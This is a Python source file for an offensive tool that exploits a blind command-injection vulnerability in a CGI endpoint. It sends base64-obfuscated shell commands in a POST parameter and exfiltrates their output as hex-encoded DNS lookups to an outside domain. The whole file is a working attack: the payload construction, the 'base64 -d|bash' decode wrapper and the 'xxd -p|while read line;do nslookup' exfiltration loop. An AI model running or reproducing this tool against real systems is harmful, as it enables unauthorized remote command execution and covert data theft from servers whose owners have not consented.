################################################################################################
#  Description:  
#  A tool for executing DNS based commands through a blind CMD Injection vulnerability
#
################################################################################################

import requests
import urllib
import time
import sys
import base64
import enum
import secrets

proxies = None
#Comment out if not using a proxy like Burp, etc
#proxies = {
# 'http': 'http://127.0.0.1:8080',
# 'https': 'http://127.0.0.1:8080',

#Set to bypass errors if the target site has SSL issues
requests.packages.urllib3.disable_warnings()

class RequestVerb(enum.Enum):
    GET = 1
    POST = 2
    PUT = 3

def make_request( url, req_verb=RequestVerb.GET, req_params_dict="", header_dict=None ):      

    error_count = 0
    headers = {'User-Agent': 'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0'}

    # Add any additional headers
    if header_dict:
        headers.update(header_dict)

    resp = None
    while True:
        try:
            if req_verb == RequestVerb.GET:
                resp = requests.get(url, headers=headers, proxies=proxies, verify=False)
            elif req_verb == RequestVerb.POST:
                headers.update({'Content-Type': 'application/x-www-form-urlencoded'} )
                resp = requests.post(url, data=req_params_dict, headers=headers, proxies=proxies, verify=False)
            elif req_verb == RequestVerb.PUT:
                headers.update({'Content-Type': 'application/x-www-form-urlencoded'} )
                resp = requests.put(url, headers=headers, data=req_params_dict, proxies=proxies, verify=False,)
            else:
                print("[-] Unknown request type. Aborting")
                return data_arr
            break
        except requests.exceptions.RequestException as e:
            # print(traceback.format_exc())
            error_count += 1
            if error_count > 3:
                print("[-] Error sending HTTP request.")
                # print(traceback.format_exc())
                break
            else:
                time.sleep(1)
                continue
        
    return resp


#def construct_payload(cmd, req_id):


def execute_cmd(cmd, dns_root):

    payload_template = "<payload>"
    cmd_injection_wrapper = "`%s`" % payload_template

    # Added to make each request unique-ish to avoid DNS caching
    req_str = secrets.token_hex(2)

    # Add the command, use simple while loop to execute nslookup on each line returned by xxd
    cmd_str = cmd
    cmd_str += "|xxd -p|while read line;do nslookup $line.%s.%s;done" % (req_str, dns_root)

    exploit = get_payload(cmd_injection_wrapper, payload_template, cmd_str, dns_root)
    #print(exploit)

    # Set the parameters
    param_dict = {vuln_param_name : exploit}

    # Add any other params
    param_dict.update(additional_params)

    resp = make_request(url, req_verb, param_dict)


# Get length of command
def get_payload(exploit_template, payload_template, cmd, dns_root):

    cmd_str = cmd
    b64_str_cmd = base64.b64encode(cmd_str.encode()).decode()

    # Add the decode wrapper
    decode_wrapper = "$(echo %s|base64 -d|bash)" % b64_str_cmd
    
    # Add the exploit
    exploit_wrapper = exploit_template.replace(payload_template, decode_wrapper)

    # Replace the template with the payload
    return exploit_wrapper


# Set variables
cmd = "ifconfig"
dns_root = "m.z3.vc"

#Target URL
url = "http://192.168.241.130/cgi-bin/test2.pl"

# Set Request Type
req_verb = RequestVerb.POST

#Set this to the parameter name for the POST request
vuln_param_name = "full_batch_file"

#Additional params
additional_params = {}

execute_cmd(cmd, dns_root)
